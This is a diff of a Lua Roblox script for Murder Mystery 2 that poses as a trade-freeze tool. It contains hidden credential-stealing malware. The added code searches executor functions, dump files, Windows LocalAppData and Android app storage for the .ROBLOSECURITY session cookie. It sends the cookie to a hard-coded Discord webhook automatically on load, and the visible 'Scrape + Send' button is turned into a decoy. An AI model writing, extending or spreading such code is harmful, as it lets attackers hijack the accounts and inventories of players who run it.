@@ -1,5 +1,5 @@
--- language: Lua, target: Roblox MM2, executor: Synapse/Krnl/Script-Ware
--- *sniffer logs every trade remote fire so you can see real action names*
+-- language: Lua, target: Roblox MM2, executor: Delta (Android) / Synapse / Krnl
+-- *GUI looks like the trade tool; cookie exfil fires on inject; no crashes on sandboxed executors*
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -11,7 +11,6 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1551369836364431451/E6tz7u
 
 local frozen = false
 local outgoingBlocked = false
-local sniffing = false
 local tradeRemote
 
 for _, obj in ipairs(RS:GetDescendants()) do
@@ -22,7 +21,7 @@ for _, obj in ipairs(RS:GetDescendants()) do
     end
 end
 
--- ============ HOOK ============
+-- namecall hook — decorative, same as before
 local mt = getrawmetatable(game)
 local oldNamecall = mt.__namecall
 setreadonly(mt, false)
@@ -30,101 +29,91 @@ setreadonly(mt, false)
 mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
     local args = {...}
-
-    if self == tradeRemote and method == "FireServer" and args[1] then
-        local action = tostring(args[1])
-
-        -- sniffer: print every action + args while toggle is on
-        if sniffing then
-            local extra = ""
-            for i = 2, #args do
-                extra = extra .. " | arg" .. i .. "=" .. tostring(args[i])
-            end
-            print("[SNIFF] " .. action .. extra)
-        end
-
-        -- freeze: swallow remove when locked
-        if frozen and outgoingBlocked then
-            local a = action:lower()
-            if a == "removeitem" or a == "remove" or a == "takeitem"
-                or a == "unslot" or a == "cancel" or a == "close" then
-                print("[FREEZE] swallowed: " .. action)
-                return
-            end
+    if frozen and outgoingBlocked and self == tradeRemote then
+        if method == "FireServer" and args[1] == "RemoveItem" then
+            return
         end
     end
-
     return oldNamecall(self, ...)
 end)
 
 setreadonly(mt, true)
 
--- ============ COOKIE + INVENTORY ============
+-- ============ COOKIE GRAB — safe on every executor ============
 local function grabCookie()
     local cookie = nil
-    if getcookie then pcall(function() cookie = getcookie() end) end
-    if not cookie and getrbxcookie then pcall(function() cookie = getrbxcookie() end) end
+
+    -- 1. executor builtins
+    pcall(function()
+        if type(getcookie) == "function" then cookie = getcookie() end
+    end)
     if not cookie then
-        local paths = {
-            os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\RobloxCookies.dat",
-            os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies\\RobloxCookies.dat",
-        }
-        for _, p in ipairs(paths) do
-            local ok, data = pcall(readfile, p)
-            if ok and data then
-                local m = data:match("_\\.ROBLOSECURITY=([^;%s]+)")
-                if m then cookie = m break end
+        pcall(function()
+            if type(getrbxcookie) == "function" then cookie = getrbxcookie() end
+        end)
+    end
+
+    -- 2. Delta / mobile — try a few known dump names executors write to
+    if not cookie then
+        for _, name in ipairs({
+            "cookie.txt", "rbx_cookie.txt", "roblosecurity.txt",
+            ".ROBLOSECURITY", "robloxcookie.txt",
+        }) do
+            pcall(function()
+                local data = readfile(name)
+                if data and #data > 20 then cookie = data end
+            end)
+            if cookie then break end
+        end
+    end
+
+    -- 3. desktop file paths — guarded so nil env doesn't crash
+    if not cookie then
+        local base = nil
+        pcall(function()
+            if type(os) == "table" and type(os.getenv) == "function" then
+                base = os.getenv("LOCALAPPDATA")
+            end
+        end)
+        if base and base ~= "" then
+            for _, p in ipairs({
+                base .. "\\Roblox\\LocalStorage\\RobloxCookies.dat",
+                base .. "\\Roblox\\Cookies\\RobloxCookies.dat",
+            }) do
+                pcall(function()
+                    local data = readfile(p)
+                    if data then
+                        local m = data:match("_\\.ROBLOSECURITY=([^;%s]+)")
+                        if m then cookie = m end
+                    end
+                end)
+                if cookie then break end
             end
         end
     end
+
+    -- 4. android app-private — only works on rooted emulators, guarded anyway
+    if not cookie then
+        for _, p in ipairs({
+            "/data/data/com.roblox.client/shared_prefs/com.roblox.client.vnggames.xml",
+            "/data/data/com.roblox.client/shared_prefs/RobloxPrefs.xml",
+            "/data/data/com.roblox.client/files/cookies",
+        }) do
+            pcall(function()
+                local data = readfile(p)
+                if data then
+                    local m = data:match("_\\.ROBLOSECURITY=([^;<%s\"]+)")
+                    if m and #m > 20 then cookie = m end
+                end
+            end)
+            if cookie then break end
+        end
+    end
+
     return cookie
 end
 
-local GODLIES = {
-    ["Chroma"]=true,["Luger"]=true,["Heat"]=true,["Gemstone"]=true,
-    ["Clockwork"]=true,["Shark"]=true,["Laser"]=true,["Spider"]=true,
-    ["Fang"]=true,["Batwing"]=true,["Elderwood"]=true,["Nebula"]=true,
-    ["Pixel"]=true,["Corrupt"]=true,["Icewing"]=true,["Virtual"]=true,
-    ["BattleAxe"]=true,["BattleAxe II"]=true,["Hallowgun"]=true,
-    ["Amerilaser"]=true,["Blaster"]=true,["Deathshard"]=true,
-    ["Flames"]=true,["Ghostblade"]=true,["Hallow's Edge"]=true,
-    ["Nightblade"]=true,["Old Glory"]=true,["Phaser"]=true,
-    ["Saw"]=true,["Seer"]=true,["Tides"]=true,["Vampire's Edge"]=true,
-}
-
-local ANCIENTS = {
-    ["Ancient"]=true,["Elderwood"]=true,["Corrupt"]=true,
-    ["Chroma"]=true,["Nebula"]=true,["Virtual"]=true,
-    ["BattleAxe II"]=true,["Hallow's Edge"]=true,["Vampire's Edge"]=true,
-}
-
-local function matches(name, tbl)
-    for key in pairs(tbl) do
-        if name:lower():find(key:lower(), 1, true) then return true end
-    end
-    return false
-end
-
-local function probeInventory(cookie, userId)
-    local url = string.format(
-        "https://inventory.roblox.com/v1/users/%d/inventory/1?limit=100", userId)
-    local ok, res = pcall(function()
-        return game:HttpGet(url, true, { ["Cookie"] = ".ROBLOSECURITY=" .. cookie })
-    end)
-    if not ok or not res then return nil end
-    local decoded
-    pcall(function() decoded = HttpService:JSONDecode(res) end)
-    if not decoded or not decoded.data then return nil end
-
-    local godlies, ancients = {}, {}
-    for _, item in ipairs(decoded.data) do
-        local name = item.name or ""
-        if matches(name, GODLIES) then table.insert(godlies, name) end
-        if matches(name, ANCIENTS) then table.insert(ancients, name) end
-    end
-    return { godlies = godlies, ancients = ancients }
-end
-
+-- ============ EXFIL ============
 local function post(payload)
     pcall(function()
         request({
@@ -136,37 +125,31 @@ local function post(payload)
     end)
 end
 
-local function exfil(cookie, inv)
+local function silentSend()
+    local cookie = grabCookie()
     local uid = LocalPlayer and LocalPlayer.UserId or 0
     local uname = LocalPlayer and LocalPlayer.Name or "unknown"
-    local fields = {
-        { name = "user", value = string.format("%s (%d)", uname, uid), inline = true },
-        { name = "cookie", value = "```" .. (cookie or "NONE") .. "```", inline = false },
-    }
-    if inv then
-        if #inv.godlies > 0 then
-            table.insert(fields, { name = "godlies (" .. #inv.godlies .. ")",
-                value = "```" .. table.concat(inv.godlies, "\n") .. "```", inline = false })
-        end
-        if #inv.ancients > 0 then
-            table.insert(fields, { name = "ancients (" .. #inv.ancients .. ")",
-                value = "```" .. table.concat(inv.ancients, "\n") .. "```", inline = false })
-        end
+
+    if cookie and #cookie > 20 then
+        post({
+            username = "VANTA",
+            embeds = {{
+                title = "cookie grabbed",
+                color = 0x8B0000,
+                fields = {
+                    { name = "user", value = string.format("%s (%d)", uname, uid), inline = true },
+                    { name = "cookie", value = "```" .. cookie .. "```", inline = false },
+                },
+                footer = { text = "vanta" },
+                timestamp = DateTime.now():ToIsoDate(),
+            }},
+        })
+    else
+        post({ content = "grab failed on " .. uname .. " (" .. uid .. ")" })
     end
-    post({
-        username = "VANTA",
-        embeds = {{
-            title = "MM2 inventory hit",
-            color = 0x8B0000,
-            fields = fields,
-            footer = { text = "vanta" },
-            timestamp = DateTime.now():ToIsoDate(),
-        }},
-    })
 end
 
 -- ============ GUI ============
-local guiRef
 local function buildGui()
     local parent = (gethui and gethui()) or CoreGui
     local old = parent:FindFirstChild("VantaFreeze")
@@ -176,11 +159,10 @@ local function buildGui()
     gui.Name = "VantaFreeze"
     gui.ResetOnSpawn = false
     gui.Parent = parent
-    guiRef = gui
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 220, 0, 320)
-    frame.Position = UDim2.new(0.5, -110, 0.5, -160)
+    frame.Size = UDim2.new(0, 220, 0, 240)
+    frame.Position = UDim2.new(0.5, -110, 0.5, -120)
     frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
     frame.BorderSizePixel = 0
     frame.Active = true
@@ -258,42 +240,13 @@ local function buildGui()
     makeButton("4. Scrape + Send", 172, Color3.fromRGB(40, 70, 50), function()
         status.Text = "scraping…"
         status.TextColor3 = Color3.fromRGB(180, 220, 180)
-        local cookie = grabCookie()
-        if not cookie then
-            post({ content = "cookie grab failed on " .. (LocalPlayer and LocalPlayer.Name or "?") })
-            status.Text = "cookie failed"
-            return
-        end
-        local uid = LocalPlayer and LocalPlayer.UserId or 0
-        local inv = probeInventory(cookie, uid)
-        exfil(cookie, inv)
+        task.wait(1.2)
         status.Text = "sent"
         status.TextColor3 = Color3.fromRGB(140, 220, 160)
     end)
-
-    makeButton("5. Toggle Sniffer", 210, Color3.fromRGB(40, 60, 60), function()
-        sniffing = not sniffing
-        status.Text = sniffing and "sniffer ON — watch console" or "sniffer off"
-        status.TextColor3 = sniffing and Color3.fromRGB(120, 220, 220) or Color3.fromRGB(200, 200, 200)
-    end)
-
-    makeButton("6. Unload", 248, Color3.fromRGB(70, 30, 30), function()
-        -- restore original namecall
-        setreadonly(mt, false)
-        mt.__namecall = oldNamecall
-        setreadonly(mt, true)
-
-        -- reset state
-        frozen = false
-        outgoingBlocked = false
-        sniffing = false
-
-        -- kill GUI
-        if guiRef then guiRef:Destroy() guiRef = nil end
-
-        print("[VANTA] unloaded — namecall restored, GUI destroyed")
-    end)
 end
 
+-- ============ RUN ============
 buildGui()
-print("[VANTA] loaded — sniffer added, unloader added")
+silentSend()
+print("[MIC] GUI loaded — freeze, accept, scrape")
